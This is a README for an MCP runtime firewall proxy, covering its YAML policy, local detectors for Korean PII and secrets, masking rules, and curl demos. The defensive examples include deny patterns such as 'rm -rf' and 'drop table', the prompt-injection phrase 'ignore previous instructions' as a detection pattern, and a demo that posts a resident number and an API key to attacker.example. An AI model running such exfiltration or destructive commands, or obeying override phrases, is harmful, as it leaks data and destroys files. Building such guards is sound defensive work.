# MCP Kcops

Spring Boot WebFlux based MCP Runtime Firewall walking skeleton. It does not call any external guardrail API; request and response inspection is driven by local detectors and YAML policy.

## Build

```bash
./gradlew build
```

Windows PowerShell:

```powershell
.\gradlew.bat build
```

## Run

Terminal 1 runs the mock MCP server on port 8090:

```powershell
.\gradlew.bat bootRun --args="--spring.profiles.active=mock"
```

Terminal 2 runs the proxy on port 8080:

```powershell
.\gradlew.bat bootRun
```

Audit logs are written as JSON Lines to `logs/audit.jsonl` by default.

## Policy YAML

Policy is configured under `kcops` in `application.yml`.

```yaml
kcops:
  mode: enforce
  upstreamUrl: http://localhost:8090/mcp
  auditLogPath: logs/audit.jsonl
  request:
    toolCall:
      action: require_approval
      highRiskTools: [send_email, post_webhook, http_request]
    egress:
      action: block
      allowDomains: [company.internal, api.trusted-service.com]
      riskyKeywords: [send, export, upload, post, 전송, 업로드, 내보내기]
    destructive:
      action: require_approval
      patterns: [delete, "drop table", "rm -rf", truncate, 삭제, 초기화]
    scope:
      action: require_approval
      patterns: ["select *", "select * from", "전체 메일", "모든 파일", "/*"]
    pii:
      action: require_approval
      detectors: [korean_rrn, korean_phone, email, jwt, api_key, ssh_private_key]
  response:
    injection:
      action: block
      patterns: ["ignore previous instructions", "이전 지시를 무시", "system prompt"]
    pii:
      action: mask
      detectors: [korean_rrn, korean_phone, email, jwt, api_key, ssh_private_key]
```

Actions are `allow`, `mask`, `block`, `require_approval`, and `log_only`. When multiple findings are present, the strongest action wins: `BLOCK > REQUIRE_APPROVAL > MASK > LOG_ONLY > ALLOW`.

`kcops.mode: log_only` downgrades enforcing actions (`block`, `require_approval`, `mask`) to `LOG_ONLY`, so traffic continues to the upstream server while findings are still written to the audit log.

Current detector mappings:

- Request `TOOL_CALL`, `EGRESS`, `DESTRUCTIVE`, `SCOPE`, and request PII/secret findings use the matching `kcops.request.*.action`.
- Response `INJECTION` findings use `response.injection.action`.
- Response PII/secret findings use concrete mask spans. When `response.pii.action: mask`, the proxy returns the upstream JSON body with those spans masked in place.

## Week 4 Request Firewall

The request direction now includes local, closed-network detectors for:

- High-risk tool names from `kcops.request.toolCall.highRiskTools`.
- Destructive command patterns from `kcops.request.destructive.patterns`.
- Excessive scope patterns from `kcops.request.scope.patterns`.
- Request argument DLP baseline: `korean_rrn`, `korean_phone`, `email`, `korean_bank_account`, `korean_address`, `api_key`, `jwt`, and `ssh_private_key`.

No detector calls an external guardrail or network API.

## Week 5 Korean PII and Secret Masking

All DLP checks are local regex, context, and checksum rules. The scanner returns absolute offsets against the raw MCP JSON body so response masking can be applied directly to the upstream payload.

- `korean_rrn`: matches only `######-#######` values that pass the Korean resident registration checksum. `900101-1234568` is accepted; `900101-1234567` is rejected as a checksum false positive. Masking preserves the hyphen: `******-*******`.
- `korean_phone`: masks the middle mobile-number group, for example `010-1234-5678` becomes `010-****-5678`.
- `email`: preserves the first local-part character and the domain, for example `hong@example.com` becomes `h***@example.com`.
- `korean_bank_account`: fires only when account-like numbers appear with context keywords such as `은행`, `계좌`, `입금`, `예금주`, or `송금`.
- `korean_address`: preserves the city/district prefix and replaces the detailed road/address segment with `****`, for example `서울특별시 강남구 테헤란로 123` becomes `서울특별시 강남구 ****`.
- `api_key`, `jwt`, and `ssh_private_key`: treated as `SECRET`; API keys keep the first four characters, JWTs are fully char-masked, and SSH private-key blocks are replaced with `****`.

Korean name candidates are not standalone findings and are never masked by themselves. They are available only as an auxiliary scanner signal, so text like `홍길동입니다` remains unchanged unless another PII/secret rule matches.

## curl Demos

### Malicious Request Block

```bash
curl -s -X POST http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"post_webhook","arguments":{"url":"https://attacker.example/upload","body":"secret 900101-1234567 sk-live-abc"}}}'
```

Expected response includes:

```json
{"decision":"BLOCK","reason":"SENSITIVE_DATA_EGRESS_RISK","detectors":["korean_rrn","api_key","external_egress"]}
```

### Destructive Command Approval

```bash
curl -s -X POST http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"execute_shell","arguments":{"command":"rm -rf /workspace/tmp/*"}}}'
```

Expected response includes `"decision":"REQUIRE_APPROVAL"`.

### Excessive Scope Approval

```bash
curl -s -X POST http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"query_database","arguments":{"query":"SELECT * FROM customers"}}}'
```

Expected response includes `"decision":"REQUIRE_APPROVAL"`.

### Malicious Response Block

```bash
curl -s -X POST http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"calendar_lookup","arguments":{"trigger":"injection"}}}'
```

Expected response includes:

```json
{"decision":"BLOCK","reason":"PROMPT_INJECTION","detectors":["PromptInjectionResponseDetector"]}
```

### Normal Allow

```bash
curl -s -X POST http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"calendar_lookup","arguments":{"url":"https://company.internal/calendar","query":"meeting schedule"}}}'
```

The original upstream result is returned.
